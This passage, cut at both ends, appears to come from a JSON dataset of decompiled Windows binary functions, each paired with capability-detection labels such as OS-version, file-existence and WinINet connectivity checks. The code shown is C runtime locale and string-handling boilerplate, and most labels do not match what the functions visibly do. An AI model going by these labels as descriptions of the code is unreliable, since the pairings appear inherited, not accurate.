        "decompiled_code": "\nvoid __cdecl fcn.0042070a(char *arg_8h, uchar *arg_ch, ushort *arg_10h, uint *arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint var_94h;\n    uint var_4h;\n    \n    var_4h = *0x44d270;\n    if (arg_8h != NULL) {\n        if ((*arg_8h == 'C') && (arg_8h[1] == '\\0')) {\n            *arg_ch = 0x43;\n            arg_ch[1] = 0;\n            if (arg_10h != NULL) {\n                *arg_10h = 0;\n                arg_10h[1] = 0;\n                arg_10h[2] = 0;\n            }\n            if (arg_14h != NULL) {\n                *arg_14h = 0;\n            }\n        }\n        else {\n            uVar1 = fcn.004196b0(arg_8h);\n            if ((0x81 < uVar1) ||\n               ((iVar2 = fcn.0041b910(0x44dbe0, arg_8h),  iVar2 != 0 &&\n                (iVar2 = fcn.0041b910(0x44db58, arg_8h),  iVar2 != 0)))) {\n                iVar2 = fcn.004204e6(&var_94h, arg_8h);\n                if ((iVar2 != 0) || (iVar2 = fcn.00424844(&var_94h, 0x450b88, &var_94h),  iVar2 == 0))\n                goto code_r0x0042085b;\n                *0x450b90 = *0x450b8c;\n                fcn.004205c2(0x44dbe0, &var_94h);\n                if ((*arg_8h == '\\0') || (uVar1 = fcn.004196b0(arg_8h),  0x81 < uVar1)) {\n                    arg_8h = 0x43de73;\n                }\n                *0x44dbda = 0;\n                fcn.00421eb0(0x44db58, arg_8h, 0x82);\n            }\n            if (arg_10h != NULL) {\n                fcn.00419370(arg_10h, 0x450b88, 6);\n            }\n            if (arg_14h != NULL) {\n                fcn.00419370(arg_14h, 0x450b90, 4);\n            }\n            fcn.004200e0(arg_ch, 0x44dbe0);\n        }\n    }\ncode_r0x0042085b:\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 626
    },
    "00420866": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00420866(uint param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t arg_8h;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint unaff_EBX;\n    int32_t iVar9;\n    int32_t unaff_ESI;\n    uint unaff_EDI;\n    uint in_stack_fffffe3c;\n    uint in_stack_fffffe40;\n    int32_t in_stack_fffffe44;\n    uint in_stack_fffffe48;\n    uint32_t arg_1ch;\n    uint32_t in_stack_fffffe50;\n    int32_t iStack420;\n    int32_t iStack404;\n    int32_t iStack400;\n    uchar uStack396;\n    uint8_t auStack395 [255];\n    uchar auStack140 [132];\n    uint uStack8;\n    \n    uStack8 = *0x44d270;\n    iVar4 = fcn.0042070a(param_1, auStack140, &stack0xfffffe50, &iStack404);\n    if (iVar4 != 0) {\n        iVar9 = unaff_ESI * 0xc;\n        iVar4 = fcn.0041b910(auStack140, *(iVar9 + 0x44dc6c));\n        if (iVar4 != 0) {\n            iVar4 = fcn.004196b0(auStack140);\n            iVar4 = fcn.004188ff(iVar4 + 1);\n            if (iVar4 != 0) {\n                arg_8h = *(iVar9 + 0x44dc6c);\n                puVar1 = unaff_ESI * 4 + 0x450b94;\n                arg_1ch = *puVar1;\n                iStack400 = unaff_ESI * 6 + 0x450c04;\n                fcn.00419370(&stack0xfffffe3c, iStack400, 6);\n                iVar3 = *0x450bac;\n                uVar5 = fcn.004200e0(iVar4, auStack140);\n                *(iVar9 + 0x44dc6c) = uVar5;\n                *puVar1 = in_stack_fffffe50 & 0xffff;\n                fcn.00419370(iStack400, &stack0xfffffe50, 6);\n                uVar8 = *0x44dcb0;\n                if (unaff_ESI == 2) {\n                    iStack400 = 0;\n                    *0x450bac = iStack404;\n                    iStack420 = *0x44db54;\n                    piVar6 = 0x44db30;\n                    iVar7 = *0x44db50;\n                    do {\n                        if (iStack404 == *piVar6) {\n                            if (iStack400 != 0) {\n                                iVar2 = iStack400 * 8;\n                                *0x44db30 = *(iVar2 + 0x44db30);\n                                *0x44db34 = *(iVar2 + 0x44db34);\n                                *(iVar2 + 0x44db30) = iVar7;\n                                *(iVar2 + 0x44db34) = iStack420;\n                            }\n                            break;\n                        }\n                        in_stack_fffffe44 = *piVar6;\n                        iStack400 = iStack400 + 1;\n                        *piVar6 = iVar7;\n                        iVar2 = piVar6[1];\n                        piVar6[1] = iStack420;\n                        piVar6 = piVar6 + 2;\n                        iVar7 = in_stack_fffffe44;\n                        iStack420 = iVar2;\n                    } while (piVar6 < 0x44db58);\n                    uVar8 = *0x44db34;\n                    if (iStack400 == 5) {\n                        iVar7 = fcn.004211e4(1, 0x4423d8, 0x7f, &uStack396, iStack404, *0x450b9c, 1, unaff_EDI, \n                                             unaff_EBX, in_stack_fffffe3c, in_stack_fffffe40, in_stack_fffffe44, \n                                             in_stack_fffffe48, arg_1ch, in_stack_fffffe50);\n                        if (iVar7 == 0) {\n                            *0x44db34 = 0;\n                        }\n                        else {\n                            uVar8 = 0;\n                            do {\n                                auStack395[uVar8 * 2] = auStack395[uVar8 * 2] & 1;\n                                uVar8 = uVar8 + 1;\n                            } while (uVar8 < 0x7f);\n                            iVar7 = fcn.004197a0(&uStack396, \n                                                 L\"        h((((                  H\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x10\\x10\\x10\\x10\\x10\\x10\\x10\u0181\u0181\u0181\u0181\u0181\u0181\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\\x10\\x10\\x10\\x10\\x10\\x10\u0182\u0182\u0182\u0182\u0182\u0182\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\\x10\\x10\\x10\\x10 \"\n                                                 , 0xfe);\n                            *0x44db34 = iVar7 == 0;\n                        }\n                        *0x44db30 = *0x450bac;\n                        uVar8 = *0x44db34;\n                    }\n                }\n                *0x44dcb0 = uVar8;\n                if (unaff_ESI == 1) {\n                    *0x450bb0 = iStack404;\n                }\n                iVar7 = (**(iVar9 + 0x44dc70))();\n                if (iVar7 == 0) {\n                    if (arg_8h != 0x44dad0) {\n                        fcn.00418911(arg_8h);\n                    }\n                }\n                else {\n                    *(iVar9 + 0x44dc6c) = arg_8h;\n                    fcn.00418911(iVar4);\n                    *puVar1 = arg_1ch;\n                    *0x450bac = iVar3;\n                }\n            }\n        }\n    }\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 1481
    },
    "00420af5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00420af5(char *param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t iStack152;\n    int32_t iStack144;\n    uchar auStack140 [132];\n    uint uStack8;\n    \n    uStack8 = *0x44d270;\n    if (param_2 != 0) {\n        if (param_1 != NULL) {\n            fcn.00420866(param_1);\n        }\n        goto code_r0x00420c2f;\n    }\n    bVar1 = true;\n    iStack144 = 0;\n    if (param_1 != NULL) {\n        if (((*param_1 == 'L') && (param_1[1] == 'C')) && (param_1[2] == '_')) {\n            do {\n                pcVar2 = fcn.00421680(param_1, 0x4424b8);\n                if (((pcVar2 == NULL) || (iVar3 = pcVar2 - param_1,  iVar3 == 0)) || (*pcVar2 == ';'))\n                goto code_r0x00420c2f;\n                iStack152 = 1;\n                puVar5 = 0x44dc74;\n                do {\n                    iVar4 = fcn.00421640(*puVar5, param_1, iVar3);\n                    if ((iVar4 == 0) && (iVar4 = fcn.004196b0(*puVar5),  iVar3 == iVar4)) break;\n                    iStack152 = iStack152 + 1;\n                    puVar5 = puVar5 + 3;\n                } while (puVar5 < 0x44dca5);\n                pcVar2 = pcVar2 + 1;\n                iVar3 = fcn.00421420(pcVar2, 0x440700);\n                if ((iVar3 == 0) && (*pcVar2 != ';')) goto code_r0x00420c2f;\n                if (iStack152 < 6) {\n                    fcn.00421eb0(auStack140, pcVar2, iVar3);\n                    auStack140[iVar3] = 0;\n                    iVar4 = fcn.00420866(auStack140);\n                    if (iVar4 != 0) {\n                        iStack144 = iStack144 + 1;\n                    }\n                }\n            } while ((pcVar2[iVar3] != '\\0') && (param_1 = pcVar2 + iVar3 + 1,  *param_1 != '\\0'));\n        }\n        else {\n            iVar3 = fcn.0042070a(param_1, auStack140, 0, 0);\n            if (iVar3 == 0) goto code_r0x00420c2f;\n            puVar5 = 0x44dc6c;\n            do {\n                if (puVar5 != 0x44dc6c) {\n                    iVar3 = fcn.0041b910(auStack140, *puVar5);\n                    if ((iVar3 == 0) || (iVar3 = fcn.00420866(auStack140),  iVar3 != 0)) {\n                        iStack144 = iStack144 + 1;\n                    }\n                    else {\n                        bVar1 = false;\n                    }\n                }\n                puVar5 = puVar5 + 3;\n            } while (puVar5 < 0x44dca9);\n            if (bVar1) {\n                fcn.0042064b();\n                fcn.00418911(*0x44dc6c);\n                *0x44dc6c = 0;\n                goto code_r0x00420c2f;\n            }\n        }\n        if (iStack144 == 0) goto code_r0x00420c2f;\n    }\n    fcn.0042064b();\ncode_r0x00420c2f:\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 893
    },
    "00420e28": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_38h_2\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: lpSrcStr\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_40h_2\n// WARNING: Variable defined which should be unmapped: var_3ch_2\n// WARNING: Variable defined which should be unmapped: var_54h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h_2\n// WARNING: Variable defined which should be unmapped: var_20h\n\nvoid __cdecl\nfcn.00420e28(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint CodePage, uint arg_24h, uint arg_8h, \n            uint arg_ch, uint arg_10h, uint cchSrc, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *lpMultiByteStr_00;\n    int32_t unaff_EBP;\n    uchar *arg_8h_00;\n    uint var_2ch;\n    uint var_48h;\n    uint var_24h_2;\n    uint var_40h;\n    uint lpWideCharStr;\n    uint lpDestStr;\n    uint cchDest;\n    uint var_20h_2;\n    uint var_24h_3;\n    uint var_28h;\n    uint var_24h;\n    uint Locale;\n    uint dwMapFlags;\n    uint lpMultiByteStr;\n    uint cbMultiByte;\n    uint var_18h_2;\n    uint var_4h;\n    uint uVar5;\n    uint uVar6;\n    uint var_38h_2;\n    uint var_34h;\n    uint var_30h_2;\n    uint var_20h;\n    uint lpSrcStr;\n    uint var_44h;\n    uint var_40h_2;\n    uint var_3ch_2;\n    uint var_38h;\n    uint var_54h;\n    uint var_30h;\n    \n    fcn.00419d14();\n    if (*0x450bb4 == 0) {\n        lpSrcStr = 0;\n        iVar1 = (*_sym.imp.KERNEL32.dll_LCMapStringW)();\n        if (iVar1 == 0) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar1 == 0x78) {\n                *0x450bb4 = 2;\n            }\n        }\n        else {\n            *0x450bb4 = 1;\n        }\n    }\n    if (0 < *(unaff_EBP + 0x14)) {\n        iVar1 = *(unaff_EBP + 0x14);\n        pcVar2 = *(unaff_EBP + 0x10);\n        do {\n            iVar1 = iVar1 + -1;\n            if (*pcVar2 == '\\0') goto code_r0x00420e8e;\n            pcVar2 = pcVar2 + 1;\n        } while (iVar1 != 0);\n        iVar1 = -1;\ncode_r0x00420e8e:\n        *(unaff_EBP + 0x14) = *(unaff_EBP + 0x14) + (-1 - iVar1);\n    }\n    if ((*0x450bb4 != 2) && (*0x450bb4 != 0)) {\n        if (*0x450bb4 != 1) goto code_r0x004211db;\n        *(unaff_EBP + -0x2c) = 0;\n        *(unaff_EBP + -0x38) = 0;\n        *(unaff_EBP + -0x34) = 0;\n        if (*(unaff_EBP + 0x20) == 0) {\n            *(unaff_EBP + 0x20) = *0x450bac;\n        }\n        lpSrcStr = *(unaff_EBP + 0x20);\n        iVar1 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n        *(unaff_EBP + -0x30) = iVar1;\n        if (iVar1 == 0) goto code_r0x004211db;\n        *(unaff_EBP + -4) = 1;\n        fcn.00418b80();\n        *(unaff_EBP + -0x18) = &fcn.00420e28::lpSrcStr;\n        *(unaff_EBP + -0x1c) = &fcn.00420e28::lpSrcStr;\n        *(unaff_EBP + -4) = 0xffffffff;\n        if (*(unaff_EBP + -0x1c) == 0) {\n            iVar3 = fcn.004188ff();\n            *(unaff_EBP + -0x1c) = iVar3;\n            if (iVar3 == 0) goto code_r0x004211db;\n            *(unaff_EBP + -0x38) = 1;\n        }\n        var_30h_2 = 1;\n        var_34h = *(unaff_EBP + 0x20);\n        iVar3 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n        if (iVar3 != 0) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_LCMapStringW)\n                              (*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + -0x1c), iVar1, 0, 0);\n            *(unaff_EBP + -0x2c) = iVar3;\n            if (iVar3 != 0) {\n                if ((*(unaff_EBP + 0xd) & 4) == 0) {\n                    *(unaff_EBP + -4) = 2;\n                    fcn.00418b80();\n                    *(unaff_EBP + -0x18) = &fcn.00420e28::var_34h;\n                    *(unaff_EBP + -0x20) = &fcn.00420e28::var_34h;\n                    *(unaff_EBP + -4) = 0xffffffff;\n                    if (*(unaff_EBP + -0x20) == 0) {\n                        iVar4 = fcn.004188ff(iVar3 * 2);\n                        *(unaff_EBP + -0x20) = iVar4;\n                        if (iVar4 == 0) goto code_r0x0042105d;\n                        *(unaff_EBP + -0x34) = 1;\n                    }\n                    iVar1 = (*_sym.imp.KERNEL32.dll_LCMapStringW)\n                                      (*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + -0x1c), iVar1, \n                                       *(unaff_EBP + -0x20), iVar3);\n                    if (iVar1 != 0) {\n                        if (*(unaff_EBP + 0x1c) == 0) {\n                            uVar6 = 0;\n                            uVar5 = 0;\n                        }\n                        else {\n                            uVar6 = *(unaff_EBP + 0x1c);\n                            uVar5 = *(unaff_EBP + 0x18);\n                        }\n                        (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                                  (*(unaff_EBP + 0x20), 0, *(unaff_EBP + -0x20), iVar3, uVar5, uVar6, 0, 0);\n                    }\n                }\n                else if ((*(unaff_EBP + 0x1c) != 0) && (iVar3 <= *(unaff_EBP + 0x1c))) {\n                    (*_sym.imp.KERNEL32.dll_LCMapStringW)\n                              (*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + -0x1c), iVar1, *(unaff_EBP + 0x18), \n                               *(unaff_EBP + 0x1c));\n                }\n            }\n        }\ncode_r0x0042105d:\n        if (*(unaff_EBP + -0x34) != 0) {\n            fcn.00418911(*(unaff_EBP + -0x20));\n        }\n        if (*(unaff_EBP + -0x38) != 0) {\n            fcn.00418911(*(unaff_EBP + -0x1c));\n        }\n        goto code_r0x004211db;\n    }\n    *(unaff_EBP + -0x28) = 0;\n    *(unaff_EBP + -0x3c) = 0;\n    if (*(unaff_EBP + 8) == 0) {\n        *(unaff_EBP + 8) = *0x450b9c;\n    }\n    if (*(unaff_EBP + 0x20) == 0) {\n        *(unaff_EBP + 0x20) = *0x450bac;\n    }\n    iVar1 = fcn.004249f9(*(unaff_EBP + 8));\n    *(unaff_EBP + -0x40) = iVar1;\n    if (iVar1 == -1) goto code_r0x004211db;\n    if (iVar1 == *(unaff_EBP + 0x20)) {\n        lpSrcStr = *(unaff_EBP + 8);\n        (*_sym.imp.KERNEL32.dll_LCMapStringA)();\n    }\n    else {\n        lpSrcStr = *(unaff_EBP + 0x20);\n        iVar1 = fcn.00424a3c(lpSrcStr, iVar1, *(unaff_EBP + 0x10), unaff_EBP + 0x14, 0, 0, 0x4424d0, 0x38);\n        *(unaff_EBP + -0x28) = iVar1;\n        if (iVar1 == 0) goto code_r0x004211db;\n        uVar6 = *(unaff_EBP + 0xc);\n        lpSrcStr = *(unaff_EBP + 8);\n        lpMultiByteStr_00 = &fcn.00420e28::lpSrcStr;\n        iVar1 = (*_sym.imp.KERNEL32.dll_LCMapStringA)();\n        *(unaff_EBP + -0x24) = iVar1;\n        arg_8h_00 = NULL;\n        if (iVar1 != 0) {\n            *(unaff_EBP + -4) = 0;\n            fcn.00418b80();\n            *(unaff_EBP + -0x18) = &fcn.00420e28::lpSrcStr;\n            *(unaff_EBP + -0x44) = &fcn.00420e28::lpSrcStr;\n            fcn.004192e0();\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (*0x10 == 0x20) {\n                lpMultiByteStr_00 = fcn.004188ff();\n                arg_8h_00 = lpMultiByteStr_00;\n                if (lpMultiByteStr_00 == NULL) goto code_r0x004211a3;\n                fcn.004192e0();\n                *(unaff_EBP + -0x3c) = 1;\n            }\n            var_30h_2 = *(unaff_EBP + 0xc);\n            var_34h = *(unaff_EBP + 8);\n            iVar1 = (*_sym.imp.KERNEL32.dll_LCMapStringA)();\n            *(unaff_EBP + -0x24) = iVar1;\n            arg_8h_00 = lpMultiByteStr_00;\n            if (iVar1 != 0) {\n                var_30h_2 = *(unaff_EBP + 0x20);\n                var_34h = *(unaff_EBP + -0x40);\n                fcn.00424a3c(var_34h, var_30h_2, lpMultiByteStr_00, unaff_EBP + -0x24, *(unaff_EBP + 0x18), \n                             *(unaff_EBP + 0x1c), lpSrcStr, uVar6);\n            }\n        }\ncode_r0x004211a3:\n        if (*(unaff_EBP + -0x3c) != 0) {\n            fcn.00418911(arg_8h_00);\n        }\n    }\n    if (*(unaff_EBP + -0x28) != 0) {\n        fcn.00418911(*(unaff_EBP + -0x28));\n    }\ncode_r0x004211db:\n    *(unaff_EBP + -0x58) = 0x4211e3;\n    fcn.00419d4f();\n    return;\n}\n",
        "token_count": 3014
    },
    "004211e4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_28h_2\n// WARNING: Variable defined which should be unmapped: var_24h_2\n// WARNING: Variable defined which should be unmapped: var_20h_2\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: lpCharType\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n\nvoid __cdecl\nfcn.004211e4(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint arg_20h_2, \n            uint noname_7, uint arg_8h, uint lpMultiByteStr, uint cbMultiByte, uint arg_14h, uint CodePage, uint arg_1ch\n            , uint arg_20h)\n\n{\n    int32_t iVar1;\n    uint *arg_8h_00;\n    uint uVar2;\n    int32_t noname_1_00;\n    int32_t unaff_EBP;\n    int32_t iVar3;\n    int32_t noname_0_00;\n    uint dwInfoType;\n    uint var_ch;\n    uint var_10h;\n    uint var_14h;\n    uint var_18h_2;\n    uint var_4h;\n    uint var_2ch;\n    uint var_28h_2;\n    uint var_24h_2;\n    uint var_20h_2;\n    int32_t lpCharType;\n    int32_t var_38h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    \n    fcn.00419d14();\n    iVar3 = 0;\n    if (*0x450bb8 == 0) {\n        var_38h = 0x42120e;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetStringTypeW)();\n        if (iVar1 == 0) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar1 == 0x78) {\n                *0x450bb8 = 2;\n            }\n        }\n        else {\n            *0x450bb8 = 1;\n        }\n    }\n    if ((*0x450bb8 == 2) || (*0x450bb8 == 0)) {\n        iVar1 = *(unaff_EBP + 0x1c);\n        if (*(unaff_EBP + 0x1c) == 0) {\n            iVar1 = *0x450b9c;\n        }\n        noname_0_00 = *(unaff_EBP + 0x18);\n        if (*(unaff_EBP + 0x18) == 0) {\n            noname_0_00 = *0x450bac;\n        }\n        noname_1_00 = fcn.004249f9(iVar1);\n        if (noname_1_00 != -1) {\n            if (noname_1_00 != noname_0_00) {\n                lpCharType = noname_0_00;\n                var_38h = noname_1_00;\n                iVar3 = fcn.00424a3c(noname_0_00, noname_1_00, *(unaff_EBP + 0xc), unaff_EBP + 0x10, 0, 0, 0x4424f8, \n                                     0x1c);\n                if (iVar3 == 0) goto code_r0x00421395;\n                *(unaff_EBP + 0xc) = iVar3;\n            }\n            lpCharType = 0x421386;\n            var_38h = iVar1;\n            (*_sym.imp.KERNEL32.dll_GetStringTypeA)();\n            if (iVar3 != 0) {\n                lpCharType = iVar3;\n                fcn.00418911(iVar3);\n            }\n        }\n    }\n    else if (*0x450bb8 == 1) {\n        *(unaff_EBP + -0x24) = 0;\n        *(unaff_EBP + -0x20) = 0;\n        if (*(unaff_EBP + 0x18) == 0) {\n            *(unaff_EBP + 0x18) = *0x450bac;\n        }\n        var_38h = (*(unaff_EBP + 0x20) != 0) * 8 + 1;\n        lpCharType = *(unaff_EBP + 0x18);\n        arg_8h_00 = &fcn.004211e4::lpCharType;\n        iVar3 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n        *(unaff_EBP + -0x28) = iVar3;\n        if (iVar3 != 0) {\n            *(unaff_EBP + -4) = 0;\n            fcn.00418b80();\n            *(unaff_EBP + -0x18) = &fcn.004211e4::lpCharType;\n            *(unaff_EBP + -0x2c) = &fcn.004211e4::lpCharType;\n            fcn.004192e0(&fcn.004211e4::lpCharType, 0, iVar3 * 2);\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (*0x10 == 0x20) {\n                arg_8h_00 = fcn.0041ac0c(2, iVar3);\n                if (arg_8h_00 == NULL) goto code_r0x00421395;\n                *(unaff_EBP + -0x20) = 1;\n            }\n            iVar3 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                              (*(unaff_EBP + 0x18), 1, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), arg_8h_00, iVar3);\n            if (iVar3 != 0) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetStringTypeW)(*(unaff_EBP + 8), arg_8h_00, iVar3, *(unaff_EBP + 0x14))\n                ;\n                *(unaff_EBP + -0x24) = uVar2;\n            }\n            if (*(unaff_EBP + -0x20) != 0) {\n                fcn.00418911(arg_8h_00);\n            }\n        }\n    }\ncode_r0x00421395:\n    *(unaff_EBP + -0x3c) = 0x42139d;\n    fcn.00419d4f();\n    return;\n}\n",
        "token_count": 1555
    },
    "0042146c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t fcn.0042146c(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = fcn.0041b5aa();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x44db2c) {\n        iVar1 = fcn.00420610();\n    }\n    if (1 < *(iVar1 + 0x28)) {\n        uVar2 = fcn.004202ae(iVar1, param_1, 1);\n        return uVar2;\n    }\n    return *(*(iVar1 + 0x48) + param_1 * 2) & 1;\n}\n",
        "token_count": 157
    },
    "004214a6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t fcn.004214a6(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = fcn.0041b5aa();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x44db2c) {\n        iVar1 = fcn.00420610();\n    }\n    if (1 < *(iVar1 + 0x28)) {\n        uVar2 = fcn.004202ae(iVar1, param_1, 2);\n        return uVar2;\n    }\n    return *(*(iVar1 + 0x48) + param_1 * 2) & 2;\n}\n",
        "token_count": 157
    },
    "004214e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t fcn.004214e0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = fcn.0041b5aa();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x44db2c) {\n        iVar1 = fcn.00420610();\n    }\n    if (1 < *(iVar1 + 0x28)) {\n        uVar2 = fcn.004202ae(iVar1, param_1, 4);\n        return uVar2;\n    }\n    return *(*(iVar1 + 0x48) + param_1 * 2) & 4;\n}\n",
        "token_count": 157
    },
    "0042151a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t fcn.0042151a(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = fcn.0041b5aa();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x44db2c) {\n        iVar1 = fcn.00420610();\n    }\n    if (1 < *(iVar1 + 0x28)) {\n        uVar2 = fcn.004202ae(iVar1, param_1, 0x80);\n        return uVar2;\n    }\n    return *(*(iVar1 + 0x48) + param_1 * 2) & 0x80;\n}\n",
        "token_count": 161
    },
    "00421559": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t fcn.00421559(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = fcn.0041b5aa();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x44db2c) {\n        iVar1 = fcn.00420610();\n    }\n    if (1 < *(iVar1 + 0x28)) {\n        uVar2 = fcn.004202ae(iVar1, param_1, 8);\n        return uVar2;\n    }\n    return *(*(iVar1 + 0x48) + param_1 * 2) & 8;\n}\n",
        "token_count": 156
    },
    "00421c50": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.00421c50(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t arg_10h;\n    \n    uVar2 = 0;\n    if (((param_1[3] & 3) == 2) && ((param_1[3] & 0x108U) != 0)) {\n        arg_10h = *param_1 - param_1[2];\n        if (0 < arg_10h) {\n            iVar1 = fcn.00421a15(param_1[4], param_1[2], arg_10h);\n            if (iVar1 == arg_10h) {\n                if (param_1[3] < '\\0') {\n                    param_1[3] = param_1[3] & 0xfffffffd;\n                }\n            }\n            else {\n                param_1[3] = param_1[3] | 0x20;\n                uVar2 = 0xffffffff;\n            }\n        }\n    }\n    param_1[1] = 0;\n    *param_1 = param_1[2];\n    return uVar2;\n}\n",
        "token_count": 260
    },
    "00421e19": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
